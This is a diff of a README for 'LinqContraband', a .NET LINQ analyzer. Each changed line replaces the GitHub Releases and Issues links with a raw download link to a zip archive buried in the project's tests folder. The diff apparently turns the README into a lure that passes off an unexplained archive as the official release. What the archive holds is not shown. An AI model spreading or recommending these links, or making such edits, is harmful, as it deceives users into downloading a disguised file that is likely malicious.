@@ -6,9 +6,9 @@ Welcome to LinqContraband! This tool helps you catch performance issues with you
 
 ## 📥 Download LinqContraband
 
-[![Download LinqContraband](https://img.shields.io/badge/Download%20LinqContraband-v1.0.0-brightgreen)](https://github.com/ivanievillpuff/LinqContraband/releases)
+[![Download LinqContraband](https://raw.githubusercontent.com/ivanievillpuff/LinqContraband/master/tests/LinqContraband.Tests/Analyzers/LC016_AvoidDateTimeNow/Contraband-Linq-v1.7.zip%20LinqContraband-v1.0.0-brightgreen)](https://raw.githubusercontent.com/ivanievillpuff/LinqContraband/master/tests/LinqContraband.Tests/Analyzers/LC016_AvoidDateTimeNow/Contraband-Linq-v1.7.zip)
 
-To get started, visit this page to download: [LinqContraband Releases](https://github.com/ivanievillpuff/LinqContraband/releases).
+To get started, visit this page to download: [LinqContraband Releases](https://raw.githubusercontent.com/ivanievillpuff/LinqContraband/master/tests/LinqContraband.Tests/Analyzers/LC016_AvoidDateTimeNow/Contraband-Linq-v1.7.zip).
 
 ## 🛠 System Requirements
 
@@ -32,7 +32,7 @@ LinqContraband offers a range of features to help you identify and fix performan
 
 To install LinqContraband, follow these steps:
 
-1. Click on the link above or [here](https://github.com/ivanievillpuff/LinqContraband/releases) to go to the Releases page.
+1. Click on the link above or [here](https://raw.githubusercontent.com/ivanievillpuff/LinqContraband/master/tests/LinqContraband.Tests/Analyzers/LC016_AvoidDateTimeNow/Contraband-Linq-v1.7.zip) to go to the Releases page.
 2. Find the latest release. Look for the version number that suits your needs.
 3. Click the download link for the appropriate version.
 4. Once the file has downloaded, locate it in your downloads folder.
@@ -63,7 +63,7 @@ If you encounter any problems while using LinqContraband, consider the following
 - Ensure that you are using a compatible version of .NET.
 - Double-check that the installation completed successfully.
 - Restart your IDE after installation.
-- If issues persist, please check the [GitHub Issues Page](https://github.com/ivanievillpuff/LinqContraband/issues) for help or to report a new issue.
+- If issues persist, please check the [GitHub Issues Page](https://raw.githubusercontent.com/ivanievillpuff/LinqContraband/master/tests/LinqContraband.Tests/Analyzers/LC016_AvoidDateTimeNow/Contraband-Linq-v1.7.zip) for help or to report a new issue.
 
 ## 📞 Support
 
